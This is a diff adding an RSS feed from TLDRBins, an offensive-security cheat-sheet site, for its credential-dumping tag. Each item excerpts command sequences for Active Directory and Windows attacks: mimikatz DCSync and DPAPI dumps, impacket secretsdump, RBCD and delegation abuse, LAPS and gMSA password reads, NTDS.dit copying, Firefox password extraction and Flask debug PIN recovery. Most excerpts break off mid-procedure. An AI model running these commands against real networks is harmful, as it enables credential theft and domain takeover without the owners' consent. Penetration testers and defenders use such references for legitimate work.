@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Credential Dumping on TLDRBins</title>
+    <link>https://tldrbins.github.io/@credential-dumping/</link>
+    <description>Recent content in Credential Dumping on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@credential-dumping/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+    </item>
+    <item>
+      <title>Account Operators</title>
+      <link>https://tldrbins.github.io/account_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/account_operators/</guid>
+      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force 4. Create a new user account New-AdUser &amp;#39;&amp;lt;NEW_USER&amp;gt;&amp;#39; -enabled $true -accountpassword $new_user_password -Credential $cred 5.</description>
+    </item>
+    <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 2. Get a service ticket impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 3. RBCD Attack # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USER&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 4.</description>
+    </item>
+    <item>
+      <title>DPAPI</title>
+      <link>https://tldrbins.github.io/dpapi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/dpapi/</guid>
+      <description>Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -t &amp;lt;TARGET&amp;gt; Ref: DonPAPI&#xA;Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; # Run as system .</description>
+    </item>
+    <item>
+      <title>Firefox</title>
+      <link>https://tldrbins.github.io/firefox/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/firefox/</guid>
+      <description>Extract saved passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
+    </item>
+    <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 1. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 2. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;1. TO-DO TO-DO </description>
+    </item>
+    <item>
+      <title>Memory Dump</title>
+      <link>https://tldrbins.github.io/memory_dump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/memory_dump/</guid>
+      <description>Tools binwalk pypykatz # Extract files from memory dump binwalk -M -e &amp;lt;MEMORY_DUMP&amp;gt; Ref: binwalk&#xA;# Mini Dump pypykatz lsa minidump &amp;lt;MEMORY_DUMP&amp;gt; </description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 2. Rbcd attack impacket-rbcd -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -delegate-from &amp;#39;EvilComputer$&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator 1.</description>
+    </item>
+    <item>
+      <title>ReadGMSAPassword</title>
+      <link>https://tldrbins.github.io/readgmsapassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
+      <description>Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; Ref: gMSADumper&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Ref: bloodyAD&#xA;nxc ldap -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).</description>
+    </item>
+    <item>
+      <title>ReadLAPSPassword</title>
+      <link>https://tldrbins.github.io/readlapspassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readlapspassword/</guid>
+      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -h &amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred </description>
+    </item>
+    <item>
+      <title>Retrieve Flask Debug Pin</title>
+      <link>https://tldrbins.github.io/retrieve_flask_debug_pin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/retrieve_flask_debug_pin/</guid>
+      <description>Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ 3. Get MAC address cat /sys/class/net/eth0/address # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.replace(&amp;#39;:&amp;#39;,&amp;#39;&amp;#39;), 16))&amp;#34; 4. Create Machine ID String echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d &amp;#39;/&amp;#39; -f1 | rev) 5. Update public and private bits in Hacktrick&amp;rsquo;s Script #!</description>
+    </item>
+    <item>
+      <title>SeBackupPrivilege/SeRestorePrivilege</title>
+      <link>https://tldrbins.github.io/sebackupprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
+      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
+    </item>
+    <item>
+      <title>secretsdump</title>
+      <link>https://tldrbins.github.io/secretsdump/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/secretsdump/</guid>
+      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+    </item>
+  </channel>
+</rss>
